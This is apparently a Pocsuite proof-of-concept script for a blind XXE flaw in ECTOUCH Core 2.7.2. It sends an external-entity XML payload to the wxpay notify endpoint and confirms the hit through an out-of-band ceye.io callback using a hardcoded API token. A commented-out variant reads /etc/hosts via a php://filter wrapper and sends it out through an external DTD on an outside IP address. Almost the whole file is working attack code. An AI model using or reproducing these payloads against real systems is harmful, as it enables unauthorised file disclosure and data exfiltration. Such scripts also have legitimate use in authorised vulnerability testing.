#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import json
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def post_url(url, payload):
    try:
        httpreq = req.Session()
        headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        }
        resp = httpreq.post(url, data=payload)
    except Exception as ex:
        resp = None
    return resp

def get_id():
    url = 'http://api.ceye.io/v1/records?token=d2af2f5d4910894d2f244c83cd9e6cc6&type=http&filter=sworderNB22222-----'
    try:
        httpreq = req.Session()
        headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        }
        resp = httpreq.get(url=url)
        resp_json = json.loads(resp.content)
        first_id = resp_json['data'][0]['id']
    except Exception as ex:
        first_id = 0
    return first_id


class TestPOC(POCBase):
    name = 'ECTOUCH Core 2.7.2 Blind XXE'
    vulID = '0'
    author = ['cws6']
    vulType = 'blind-xxe'
    version = '1'
    references = ['https://www.anquanke.com/post/id/169960']
    desc = '''ECTOUCH Core 2.7.2 Blind XXE'''

    vulDate = '2019-01-23'
    createDate = '2019-04-08'
    updateDate = '2019-04-08'

    appName = 'ectouch'
    appVersion = '2.7.2'
    appPowerLink = 'http://www.ectouch.cn'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify mode"""
        result = {}
        init_id = get_id()
        payload1 = '/index.php?m=default&c=Respond&a=index&code=wxpay&type=notify&style=xxx'
        payload_win = '<?xml version="1.0"?> <!DOCTYPE b [<!ENTITY xxe SYSTEM "http://5rqfog.ceye.io/sworderNB22222-----">]><name>&xxe;</name>'
        # payload_linux = '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE data [ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts"><!ENTITY % dtd SYSTEM "http://120.79.178.83/xxe/xxe.xml">%dtd; %all;]><value>&send;</value>'
        resp_win = post_url(self.url + payload1,payload_win)
        # resp_linux = post_url(self.url,payload_linux)
        match_id = get_id()
        time.sleep(1)
        if init_id != match_id:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

